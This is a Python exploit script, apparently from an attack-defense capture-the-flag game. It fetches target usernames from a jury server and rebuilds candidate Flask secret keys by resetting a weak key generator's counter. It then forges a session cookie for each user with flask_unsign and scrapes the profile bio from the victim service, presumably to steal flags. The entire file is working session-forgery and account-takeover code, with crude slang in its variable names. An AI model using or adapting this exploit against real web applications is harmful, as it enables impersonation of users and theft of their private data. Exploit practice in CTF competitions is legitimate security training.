import sys
import requests
import json
import re
from bs4 import BeautifulSoup
import os
from itsdangerous import URLSafeTimedSerializer, URLSafeSerializer
from flask_unsign.session import sign

from modules import SKZI


JURY_IP = "10.10.10.10"
IP = sys.argv[1]
BASE_APP = f"http://{IP}:10000"

def get_attack_data():
    data = requests.get(f"http://{JURY_IP}/api/client/attack_data").json()['pickme-house'][IP]
    cock = []
    
    for item in data:
        user = {}
        item = item.replace("'", '"')
        user = json.loads(item)

        if 'rec_id' not in user and 'level' not in user:
            username = user.get('user')
            if username:
                cock.append(username)
    return cock

def generate_all_possible_keys():
    keys = []
    SKZI._counter = 0
    for i in range(100):
        key = SKZI.generate_secure_key(24)
        keys.append(key)
    return list(set(keys))

def forge_session_cookie(username, secret_key):
    return sign({'agent': username},secret_key)

def get_profile_bio(BASE_APP, session_cookie):
    cookies = {'session': session_cookie}
    try:
        response = requests.get(f'{BASE_APP}/profile', cookies=cookies, timeout=5, allow_redirects=False)
        if response.status_code == 200:
            if 'Invalid credentials' not in response.text:
                return response.text
        elif response.status_code == 302:
            location = response.headers.get('Location', '')
            if 'login' in location.lower():
                return None
        return None
    except Exception:
        return None


def extract_bio(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    textarea = soup.find('textarea', attrs={'name': 'bio'})

    if not textarea:
        textarea = soup.find('textarea', id='bio')

    if textarea:
        bio_text = textarea.get_text().strip()
        return bio_text

    return None


def main():
    
    pickmeloxi = get_attack_data()
    possible_keys = generate_all_possible_keys()
    
    for lox in pickmeloxi:
        for key in possible_keys:
            try:
                session_cookie = forge_session_cookie(lox, key)                
                profile_content = get_profile_bio(BASE_APP, session_cookie)

                if profile_content:
                    bio = extract_bio(profile_content)
                    if bio:
                        print(bio)
                        return
            except Exception:
                continue
        
        print("не удалось получить биографию")


if __name__ == '__main__':
    main()
